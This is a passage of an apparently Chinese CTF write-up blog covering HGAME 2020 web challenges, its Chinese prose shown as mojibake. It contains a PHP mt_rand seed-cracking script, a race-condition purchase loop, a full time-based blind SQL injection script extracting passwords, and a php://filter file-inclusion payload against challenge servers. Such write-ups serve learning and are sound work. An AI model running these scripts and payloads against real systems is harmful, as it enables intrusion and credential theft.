<span class="number">31</span>)</span><br><span class="line">    <span class="comment"># remove mask if present</span></span><br><span class="line">    <span class="keyword">if</span> s22X_0:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Another easy guess</span></span><br><span class="line">    s227_31 = bv(X, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># remove bit if present</span></span><br><span class="line">    <span class="keyword">if</span> s227_31:</span><br><span class="line">        X ^= <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We're missing bit 0 and bit 31 here, so we have to try every possibility</span></span><br><span class="line">    s228_1_30 = (X &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> s228_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> s228_31 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_MT19937 <span class="keyword">and</span> s22X_0 != s228_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s228 = s228_0 | s228_31 &lt;&lt; <span class="number">31</span> | s228_1_30</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the results are consistent with the known bits of s227</span></span><br><span class="line">            s227 = _undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">and</span> bv(s227, <span class="number">0</span>) != s22X_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> bv(s227, <span class="number">31</span>) != s227_31:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the guessed seed yields S000 as its first scrambled state</span></span><br><span class="line">            rand = undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            state = php_mt_initialize(rand)</span><br><span class="line">            php_mt_reload(state, flavour)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (S000 == state[offset]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> rand</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(_R000, _R227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># Both were &gt;&gt; 1, so the leftmost byte is unknown</span></span><br><span class="line">    _R000 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    _R227 &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> R000_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> R227_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            R000 = _R000 | R000_0</span><br><span class="line">            R227 = _R227 | R227_0</span><br><span class="line">            S000 = undo_php_mt_rand(R000)</span><br><span class="line">            S227 = undo_php_mt_rand(R227)</span><br><span class="line">            seed = undo_php_mt_reload(S000, S227, offset, flavour)</span><br><span class="line">            <span class="keyword">if</span> seed:</span><br><span class="line">                <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed=main(int(arg1), int(arg2), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">print(seed)</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'ans'</span>:seed</span><br><span class="line">&#125;</span><br><span class="line">res1=s.post(url1,data)</span><br><span class="line">print(res1.text)</span><br><span class="line">time_end=time.time()</span><br><span class="line">print(<span class="string">'totally cost'</span>,time_end-time_start)</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿æˆ‘åŠ äº†ä¸ªè®¡æ—¶å™¨è¾“å‡ºè¿è¡Œæ—¶é—´ï¼Œå¯æ˜¯è²Œä¼¼æ—¶é—´çº¦0.3så·¦å³æ—¶ä¹Ÿæ²¡æ‹¿åˆ°flagã€‚å¥½åœ¨è‡ªå·±æ²¡æ”¾å¼ƒä¸€ç›´è¯•ï¼Œåé¢è„šæœ¬è¿è¡Œæ—¶é—´å·®ä¸å¤šä¸€ç›´ä¸º0.18så·¦å³æ—¶æ‹¿åˆ°flagäº†ã€‚å¯èƒ½ä¸€å¼€å§‹è‡ªå·±å†…å­˜è·‘å¤ªæ»¡äº†å§â€¦â€¦<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><p>ps:æˆ‘é”™äº†ã€‚åæ¥æ‰å‘ç°è¿™ä¸ªæ´å¾ˆæœ‰ç”¨å¤„ã€‚å› ä¸ºå¾ˆå¤šcmsçš„cookieæ˜¯ç›´æ¥<code>mt_rand()</code>ç”Ÿæˆçš„ã€‚æ‰€ä»¥ä¼ªé€ cookieæ˜¯ä¸€ç§å¦™æ‹›</p><h1 id="Cosmosçš„äºŒæ‰‹å¸‚åœº"><a href="#Cosmosçš„äºŒæ‰‹å¸‚åœº" class="headerlink" title="Cosmosçš„äºŒæ‰‹å¸‚åœº"></a>Cosmosçš„äºŒæ‰‹å¸‚åœº</h1><p> æœ‰äº›ä¸¢è„¸ã€‚èƒ½åšå‡ºæ¥æ˜¯é å¸ˆå‚…çš„æç¤ºã€‚ä¹‹å‰æœ€å¤§çš„é—®é¢˜ä¸»è¦åœ¨äºæ²¡æœ‰è¾¨æå‡ºæ¼æ´æ‰€åœ¨ï¼Œå› æ­¤ä¸å¥½ä¸‹æ‰‹ã€‚åƒè¿™ç±»ä¹°å–ä¸œè¥¿çš„é¢˜ç›®ï¼Œæˆ‘è‡ªå·±çš„è®¤è¯†ä¸»è¦æ¥æºäºhackergame2019çš„è¾¾æ‹‰å´©å§å¤§å†’é™©ã€‚å½“æ—¶é‡Œé¢æ¼æ´ä¹‹å¤„åœ¨äºè‡ªå·±çš„æˆ˜æ–—åŠ›å¯ä»¥ä¸ºè´Ÿæ•°ï¼Œæ‰€ä»¥å¼•ç”³å‡ºè´Ÿæº¢å‡ºã€‚è€Œè¿™é“é¢˜å¼€å§‹æˆ‘ä¹Ÿå½“æˆè´Ÿæº¢å‡ºäº†ï¼Œå®é™…ä¸Šæ˜¯ä¸ªå¤šçº¿ç¨‹ï¼Œæˆ–è®¸å«æ¡ä»¶ç«äº‰æ›´ä¸ºå‡†ç¡®ã€‚</p><p>ç”¨burpé‡å¤å‘åŒ…å–ä¸œè¥¿ï¼ŒåŒæ—¶è‡ªå·±ç”¨pythonè„šæœ¬ä¸æ–­ä¹°ä¸œè¥¿ã€‚åªè¦burpçš„çº¿ç¨‹æ•°å¿«äºpythonçš„ï¼Œå°±å¯ä»¥ä¿è¯é‡‘é’±æ•°åœ¨å¢åŠ ã€‚<br>pyhtonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">'http://121.36.88.65:9999//API/?method=buy'</span></span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'d0ov3vsd1hpjjf8ofuakhacd0n'</span>&#125;</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">'code'</span>: <span class="string">'800002'</span>,</span><br><span class="line">    <span class="string">'amount'</span>: <span class="string">'30'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000000</span>):</span><br><span class="line">    res=requests.post(url,data=payload,cookies=cookies,headers=headers)</span><br><span class="line">    time.sleep(<span class="number">0.6</span>)</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒèœï¼Œå¤šçº¿ç¨‹å¿˜å…‰äº†ï¼Œæ‰€ä»¥ç›´æ¥æ¯æ¬¡forå¾ªç¯ç”¨å<code>sleep()</code>ä¸€ä¸‹ã€‚<br>burpç›´æ¥é‡å¤å‘åŒ…ï¼š<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="payloadè°ƒæˆNullPayloads"><br>æœ€åå¤šè·‘å‡ éï¼Œé’±æ•°å¤Ÿäº†åæ‹¿åˆ°flag<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="Cosmosçš„ç•™è¨€æ¿-2"><a href="#Cosmosçš„ç•™è¨€æ¿-2" class="headerlink" title="Cosmosçš„ç•™è¨€æ¿-2"></a>Cosmosçš„ç•™è¨€æ¿-2</h1><p>æœ‰ç‚¹å‘ã€‚é¢˜ç›®å‘ä¸åœ¨éš¾åº¦ä¸Šï¼Œä¸»è¦æ˜¯ç¯å¢ƒå¤ªå·®äº†ï¼Œä¼°è®¡å‡ ä¸ªäººä¸€èµ·æ³¨å°±è¦å‡ºé—®é¢˜ã€‚å¥½åœ¨è”ç³»å‡ºé¢˜äººé‡å¯äº†ä¸¤éæ€»ç®—èƒ½åšäº†ï¼Œæ¯•ç«Ÿéƒ½æ˜¯ç”¨çš„å­¦ç”Ÿæœºï¼Œèƒ½ç†è§£çš„ã€‚</p><p>é¦–å…ˆæ˜¯æ‰¾æ¼æ´ã€‚é¢˜ç›®åç§°æ˜æ˜¾æ˜¯week2ç•™è¨€æ¿çš„åç»­ï¼Œä¹Ÿå°±æ˜¯è¯´å¤šåŠæ˜¯sqlæ³¨å…¥ã€‚å¼€å§‹è¿›å»ä¸€ä¸ªç™»å½•æ¡†ï¼Œæä¾›äº†æ³¨å†ŒåŠŸèƒ½ã€‚æ‰€ä»¥å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ç™»è¿›å»ã€‚æœŸé—´å®¹æ˜“å‘ç°å¯¹ç”¨æˆ·åçš„è¿‡æ»¤å¾ˆä¸¥æ ¼ï¼›è¿›å»åå‘ç°ä¸€ä¸ªç•™è¨€æ¿ã€‚é€šå¸¸ç•™è¨€æ¿å¤šåŠæ˜¯xssæˆ–è€…sqlæ³¨å…¥äº†å§ã€‚äºæ˜¯å°è¯•ç•™å‡ ä¸ªè¨€ã€‚å‘ç°éƒ½ä¸è¡Œã€‚è¿™æ—¶æ³¨æ„åˆ°ä¸€ä¸ªåˆ é™¤åŠŸèƒ½ï¼Œç‚¹å‡»åˆ é™¤åŠŸèƒ½æ—¶å‡ºç°çš„urlæ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?method&#x3D;delete&amp;delete_id&#x3D;1101</span><br></pre></td></tr></table></figure><p>å¼€å§‹æˆ‘çš„ç¬¬ä¸€æƒ³æ³•æ˜¯è¿™æ ·çš„ï¼š(å‚è€ƒç½‘ä¸Šæœåˆ°çš„æ–‡ç« ï¼š<a href="https://juejin.im/entry/5c11e35b51882530e46188ed" target="_blank" rel="noopener">https://juejin.im/entry/5c11e35b51882530e46188ed</a><br>ï¼‰<br>è¿™é“é¢˜ç›®éš¾åº¦æ˜¾ç„¶è¦é«˜ä¸å°‘ï¼Œä½†ç»™æˆ‘å¾ˆå¤§å¯å‘ã€‚å…¶æ³¨å…¥ç‚¹åœ¨äºåˆ é™¤æ“ä½œä¸­çš„è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $conn-&gt;query(&quot;delete from note where id&#x3D;$id and user&#x3D;&#39;$user&#39;&quot;);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>$user</code>æ˜¯å¯æ³¨çš„ã€‚æ‰€ä»¥é‚£é“é¢˜ç›®åœ¨æ‰§è¡Œåˆ é™¤æ“ä½œæ—¶å°±å¯ä»¥è§¦å‘å·²ç»æ³¨å…¥çš„åå­—ï¼Œå¼•èµ·äºŒæ¬¡æ³¨å…¥ã€‚è¿™ä¹Ÿæ˜¯æˆ‘å¼€å§‹å¯¹ç•™è¨€æ¿è¿™é¢˜çš„åˆ¤æ–­ï¼šäºŒæ¬¡æ³¨å…¥ã€‚ä½†æ˜¯å°è¯•æ³¨å†Œæ—¶å‘ç°è¿‡æ»¤çš„å®åœ¨æ˜¯å¤ªå¤šäº†ï¼ŒåŸºæœ¬ä¸å¯èƒ½æ³¨å†Œä¸€ä¸ªsqlè¯­å¥ï¼Œçœ‹æ¥æ˜¯åœ¨å…¶ä»–åœ°æ–¹å¯æ³¨ã€‚<br>ä¹‹ååˆé‡æ–°æ³¨æ„åˆ°ä¸Šé¢æåˆ°çš„åˆ é™¤è¯­å¥ï¼Œå‘ç°ä¸€ä»¶äº‹ï¼Œå½“æˆ‘åœ¨burpé‡Œä¸æ”¹å˜<code>delete_id</code>é‡å¤å‘åŒ…æ—¶ï¼Œç»“æœéƒ½æ˜¾ç¤ºçš„åˆ é™¤æˆåŠŸã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªæ“ä½œå¹¶æ²¡æœ‰çœŸæ­£åˆ æ‰æˆ‘ä»¬çš„è¯­å¥ã€‚ä»”ç»†FUZZçš„è¯ï¼Œå‘ç°åªè¦idä¼ æ•°å­—ï¼Œä»»ä½•æ•°å­—éƒ½ä¸ä¼šæŠ¥é”™ã€‚åˆ¤æ–­æ˜¯æ•°å€¼å‹æ³¨å…¥ã€‚<br>ä½†æ˜¯å›æ˜¾å°±å¾ˆéš¾å—äº†ï¼Œå°è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete_id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete_id&#x3D;1 and 1&#x3D;2</span><br></pre></td></tr></table></figure><p>çš„å›æ˜¾éƒ½æ˜¯åˆ é™¤æˆåŠŸã€‚è¿™å°±ä¸å¤ªå¦™äº†ã€‚è€Œä¸”ç»è¿‡FUZZåå¹¶æ²¡æœ‰è¿‡æ»¤æ‰å…³é”®å­—ã€‚åªèƒ½å°è¯•ç›²æ³¨ï¼Œè€Œä¸”æ˜¯æ—¶é—´ç›²æ³¨ã€‚<br>è¿™é‡Œåæ§½ä¸‹é¢˜ç›®ï¼Œè‡ªå·±åšæ—¶é¢˜ç›®çš„idå·²ç»äº”åƒå¤šï¼Œåˆ é™¤æ“ä½œæ¯æ¬¡éƒ½è´¼å¡ã€‚æˆ‘ç”¨è„šæœ¬æµ‹è¯•æ—¶é—´ç›²æ³¨æœ€ç®€å•çš„è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete_id&#x3D;if(length(database())&lt;100,sleep(5),1)</span><br></pre></td></tr></table></figure><p>éƒ½æ²¡æœ‰å»¶è¿Ÿï¼Œä¸€åº¦è®©æˆ‘æ€€ç–‘è¿™ä¸ªå‚æ•°æ˜¯å¦å¯æ³¨äº†ã€‚ç„¶è€ŒåŒæ ·çš„payloadç¬¬äºŒå¤©æ—©ä¸Šè·‘(ä¼°è®¡å› ä¸ºåšé¢˜çš„äººè¿™æ—¶å€™å¹¶ä¸å¤š)å°±æµ‹å‡ºæœ‰å»¶æ—¶ã€‚éš¾å—ï¼Œæµªè´¹äº†æˆ‘å¥½é•¿æ—¶é—´è‡ªæˆ‘æ€€ç–‘ã€‚<br>æ‰€ä»¥è´´ä¸‹è„šæœ¬å§ï¼Œé¢˜ç›®å¯¹å…³é”®å­—å¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œå”¯ä¸€çš„é—®é¢˜å°±æ˜¯ç¯å¢ƒä¸å¥½ï¼Œæ¯æ¬¡è·‘éƒ½è·‘ä¸å‡ºå®Œæ•´ç»“æœã€‚åªæœ‰æœ€åä¸€æ¬¡å«å‡ºé¢˜äººé‡å¯ç¯å¢ƒæ—¶æ‰æˆåŠŸè·‘å‡ºæ¯ä¸€ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>:<span class="string">'f9nl4jl987d07pisnq508o1kg7'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        url = <span class="string">"http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select group_concat(password) from user),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">",sleep(10),1)"</span></span><br><span class="line">        <span class="comment">#if(length(database())="+str(i)+",sleep(6),1)"  7</span></span><br><span class="line">        <span class="comment">#if(ascii(substr(database(),1,1))="+str(i)+",sleep(6),1)    babysql</span></span><br><span class="line">        <span class="comment">#if(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),"+str(i)+",1))="+str(j)+",sleep(6),1)    messages , user</span></span><br><span class="line">        <span class="comment">#if(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='messages'),"+str(i)+",1))="+str(j)+",sleep(6),1)    message-id ,user-id,message</span></span><br><span class="line">        <span class="comment">#if(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='user'),"+str(i)+",1))="+str(j)+",sleep(6),1)          id, name,password</span></span><br><span class="line">        <span class="comment">#if(ascii(substr((select group_concat(name) from user),"+str(i)+",1))="+str(j)+",sleep(6),1)   cosmos,</span></span><br><span class="line">        <span class="comment"># if(ascii(substr((select group_concat(password) from user),"+str(i)+",1))="+str(j)+",sleep(6),1)  f1FXOCnj26Fkadzt4Sqynf6O7CgR</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = requests.get(url, cookies=cookies, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¼€å§‹éƒ½æ˜¯<code>sleep(6)</code>ä¹Ÿèƒ½æ³¨,åæ¥ä¸å¾—ä¸è°ƒæ•´åˆ°<code>sleep(10)</code>æ‰å¥½è½¬äº†ã€‚æ€»ä¹‹é¢˜ç›®æ˜¯æ¯”è¾ƒåŸºæœ¬çš„æ—¶é—´ç›²æ³¨ï¼Œä½†æˆ‘ä¼°è®¡å¾ˆå¤šäººå› ä¸ºç¯å¢ƒæœ¬æ¥å¯ä»¥åšçš„æœ€åéƒ½ä¸å¾—ä¸æ”¾å¼ƒã€‚æœ€åæ˜¯æ³¨å‡ºuserè¡¨é‡Œçš„cosmosè·Ÿå¯†ç ï¼Œç™»å½•å³å¯ã€‚<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­ç”µhgame-week2</title>
      <link href="2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/"/>
      <url>2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/</url>
      
        <content type="html"><![CDATA[<p>   ç¬¬äºŒå‘¨çš„é¢˜ç›®æ˜æ˜¾éš¾åº¦æå‡äº†äº›è®¸ï¼Œä¸è¿‡ç¨å¾®èŠ±ç‚¹æ—¶é—´è¿˜æ˜¯èƒ½åšçš„ã€‚å› ä¸ºæ—¶é—´åŸå› åªåšäº†webï¼Œä½†æ˜¯èƒ½akæ‰webå·²ç»ç®—ä¸é”™äº†hhhã€‚å¸Œæœ›åœ¨åé¢ä¸¤ä¸ªweekè¿˜èƒ½ç»§ç»­å¦‚æ­¤å§ã€‚å…¶ä¸­å› ä¸ºç¬¬å››é“é¢˜èŠ±äº†å¾ˆé•¿æ—¶é—´æ‰åšå‡ºæ¥ï¼Œå¹²è„†æ€»ç»“ä¸‹åšé¢˜ç»éªŒé¡ºä¾¿å½“å­¦ä¹ ç¬”è®°å†™å†™ã€‚</p><a id="more"></a><h1 id="Cosmosçš„åšå®¢åå°"><a href="#Cosmosçš„åšå®¢åå°" class="headerlink" title="Cosmosçš„åšå®¢åå°"></a>Cosmosçš„åšå®¢åå°</h1><p>ä¸ªäººè§‰å¾—è¿™é“é¢˜å‡ºçš„æŒºä¸é”™çš„ã€‚è‡³å°‘æŠŠæˆ‘ä¹‹å‰æ·¡å¿˜çš„å‡ ä¸ªçŸ¥è¯†ç‚¹éƒ½æ•´åˆåˆ°ä¸€èµ·ã€‚ä¹Ÿé¡ºä¾¿æé†’äº†æˆ‘æ¥ä¸‹æ¥çš„å­¦ä¹ ç¬”è®°è¦å†™å•¥hhhã€‚</p><p>é¦–å…ˆè¿›å»ä¸€ä¸ªç™»é™†æ¡†ã€‚ç¬¬ä¸€ååº”å½“ç„¶æ˜¯sqlæ³¨å…¥ã€‚ä½†æ˜¯å›æ˜¾å¾ˆæœ‰æ„æ€ã€‚</p><p><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å›æ˜¾"></p><p>è¿™ä¸ªâ€œç”¨æˆ·åæˆ–å¯†ç é”™è¯¯â€å›æ˜¾ç›´æ¥å¦å®šäº†æˆ‘ä»¬ä»»ä½•å…³äºsqlæ³¨å…¥çš„å¯èƒ½ã€‚åŠ ä¸Šæ²¡ä»€ä¹ˆéšè—ä¿¡æ¯ï¼Œå¯¼è‡´æˆ‘å½“æ—¶è¿™é¢˜å°±å…ˆæ”¾ç€å»åšç¬¬äºŒé“äº†ã€‚ä¹‹åå›è¿‡å¤´çœ‹æ—¶ï¼Œæ‰æƒ³èµ·æ¥è¦æŠ“ä¸ªåŒ…ã€‚äºæ˜¯å‘ç°å­˜åœ¨ä¸€ä¸ªè·³è½¬<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="action"></p><p>çœ‹åˆ°actionå°±ç«‹é©¬æœ‰äº†æ–°æ€è·¯ã€‚å› ä¸ºè¿™æ­£æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨çš„å¿…å¤‡å‚æ•°ã€‚é‚£ä¹ˆå°±è¯•è¯•è¯»æ–‡ä»¶å§ã€‚æœæ–­å°è¯•ä¼ªåè®®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè‡ªå·±è¢«è‡ªå·±ä¹‹å‰å†™çš„æ–‡ç« å‘åˆ°äº†â€¦â€¦åŸæ¥ä¸€æ—¶å…´èµ·å†™äº†ä¸ªâ€œä¼ªåè®®æ€»èƒ½ç»™ä½ æƒŠå–œâ€ï¼Œç»“æœæ–‡ç« é‡Œæ³¨é‡<code>php://input</code>ï¼Œä½†æ²¡æœ‰å‘ç°<code>php://filter</code>è¯»æ–‡ä»¶çš„payloadå†™é”™äº†â€¦..è‡ªå·±æœ‰ç‚¹æ·¡å¿˜å°±æ‹¿æ–‡ç« é‡Œçš„payloadå¤åˆ¶ç²˜è´´ï¼Œç»“æœåŠå¤©ä¸å‡ºç»“æœã€‚åæ¥æ‰å‘ç°è‡ªå·±å†™é”™äº†ã€‚<br>æ€»ä¹‹è¯»åˆ°æºç ,base64è§£ç åï¼š<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$action = @$_GET[<span class="string">'action'</span>];</span><br><span class="line">$filter = <span class="string">"/config|etc|flag/i"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($filter, $_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker get out!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">include</span> $action;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) || <span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    header(<span 